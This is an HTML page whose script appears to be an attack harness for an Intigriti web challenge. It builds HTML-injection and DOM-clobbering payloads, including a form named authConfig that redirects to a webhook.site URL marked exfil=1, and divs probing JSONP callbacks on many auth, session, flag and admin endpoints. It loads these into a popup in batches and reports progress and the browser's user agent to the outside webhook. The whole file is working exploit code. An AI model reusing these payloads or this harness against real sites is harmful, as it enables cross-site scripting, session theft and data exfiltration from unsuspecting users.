<!doctype html>
<meta charset="utf-8">
<title>challenge0326 batch harness</title>
<body>batch-harness</body>
<script>
const RUN = 'seq2';
const SINK = 'https://webhook.site/caaac3a6-72f9-4933-ae3a-1a8e17e3baf4';
const TARGET = 'https://challenge-0326.intigriti.io/challenge.html?q=';
const STEP_DELAY_MS = 2000;
const BATCH_SIZE = 60;

function ping(message) {
  fetch(`${SINK}?run=${encodeURIComponent(RUN)}&m=${encodeURIComponent(message)}&t=${Date.now()}`, {
    mode: 'no-cors',
    credentials: 'omit',
    cache: 'no-store'
  }).catch(() => {});
}

function chunk(items, size) {
  const batches = [];
  for (let index = 0; index < items.length; index += size) {
    batches.push(items.slice(index, index + size));
  }
  return batches;
}

function buildPayload(batchId, requestPaths) {
  const parts = [
    `<form name=authConfig data-next="${SINK}?run=${encodeURIComponent(RUN)}&batch=${encodeURIComponent(batchId)}&exfil=1" data-append="true"></form>`
  ];

  for (const requestPath of requestPaths) {
    const config = JSON.stringify({
      path: '/',
      type: requestPath.replace(/^\//, '') + '#'
    });
    parts.push(`<div data-component="true" data-config='${config}'></div>`);
  }

  return parts.join('');
}

function toChallengeUrl(batchId, requestPaths) {
  return TARGET + encodeURIComponent(buildPayload(batchId, requestPaths));
}

function buildCandidates() {
  const set = new Set();
  const callbackValue = 'Auth.loginRedirect';
  const callbackKeys = ['callback', 'cb'];
  const jsonpModes = ['format=jsonp'];

  function add(path) {
    set.add(path);
  }

  function addCallbackVariants(path) {
    add(path);
    const separator = path.includes('?') ? '&' : '?';
    for (const key of callbackKeys) {
      add(`${path}${separator}${key}=${encodeURIComponent(callbackValue)}`);
    }
    for (const mode of jsonpModes) {
      add(`${path}${separator}${mode}&callback=${encodeURIComponent(callbackValue)}`);
    }
  }

  [
    '/search',
    '/query',
    '/results',
    '/records',
    '/datastore',
    '/intelligence',
    '/threats',
    '/intel',
    '/ops',
    '/operational',
    '/api/search',
    '/api/query',
    '/api/results',
    '/api/records',
    '/api/datastore',
    '/api/intelligence',
    '/api/threats',
    '/api/intel',
    '/api/ops',
    '/internal/search',
    '/api/internal/search',
    '/search/internal',
    '/search/results'
  ].forEach(base => {
    addCallbackVariants(`${base}?domain=internal&q=x`);
    addCallbackVariants(`${base}?domain=internal&query=x`);
    addCallbackVariants(`${base}?q=x`);
  });

  [
    '/auth',
    '/login',
    '/session',
    '/me',
    '/user',
    '/profile',
    '/account',
    '/flag',
    '/auth/callback',
    '/auth/redirect',
    '/auth/return',
    '/auth/result',
    '/auth/complete',
    '/auth/finish',
    '/login/callback',
    '/login/redirect',
    '/session/callback',
    '/session/redirect',
    '/session/me',
    '/auth/me',
    '/api/session',
    '/api/me',
    '/api/user',
    '/api/profile',
    '/api/account',
    '/api/flag',
    '/api/auth',
    '/api/auth/callback',
    '/api/auth/session',
    '/api/auth/me',
    '/oauth/callback',
    '/oauth2/callback',
    '/oidc/callback',
    '/signin-oidc',
    '/signout-callback-oidc',
    '/sso/callback'
  ].forEach(addCallbackVariants);

  [
    '/admin',
    '/admin/review',
    '/admin/panel',
    '/admin/callback',
    '/admin/session',
    '/debug',
    '/debug/auth',
    '/debug/session',
    '/debug/callback',
    '/review',
    '/status',
    '/health',
    '/diag',
    '/diagnostics',
    '/config',
    '/env',
    '/whoami',
    '/api/status',
    '/api/config',
    '/api/debug',
    '/api/review',
    '/api/report',
    '/api/admin'
  ].forEach(addCallbackVariants);

  return Array.from(set);
}

function navigatePopupBatches() {
  const candidates = buildCandidates();
  const batches = chunk(candidates, BATCH_SIZE).map((paths, index) => ({
    id: `b${String(index + 1).padStart(2, '0')}`,
    paths
  }));

  ping(`main:boot:${navigator.userAgent}`);
  ping(`main:candidate-count:${String(candidates.length)}`);
  ping(`main:batch-count:${String(batches.length)}`);

  let popup = null;
  try {
    popup = window.open('about:blank', 'intigriti-batch-probe');
    ping(`main:popup-open:${String(!!popup)}`);
  } catch (error) {
    ping(`main:popup-open-error:${error.name}:${error.message}`);
    return;
  }

  batches.forEach((batch, index) => {
    const url = toChallengeUrl(batch.id, batch.paths);
    setTimeout(() => {
      ping(`nav:${batch.id}:len:${String(url.length)}:count:${String(batch.paths.length)}`);
      try {
        if (popup) {
          popup.location = url;
        }
      } catch (error) {
        ping(`nav-error:${batch.id}:${error.name}:${error.message}`);
      }
    }, index * STEP_DELAY_MS);
  });

  setTimeout(() => {
    try {
      ping(`main:popup-closed-final:${popup ? String(popup.closed) : 'null'}`);
    } catch (error) {
      ping(`main:popup-closed-final-error:${error.name}:${error.message}`);
    }
    document.body.textContent = `done:${RUN}`;
  }, batches.length * STEP_DELAY_MS + 2000);
}

navigatePopupBatches();
</script>
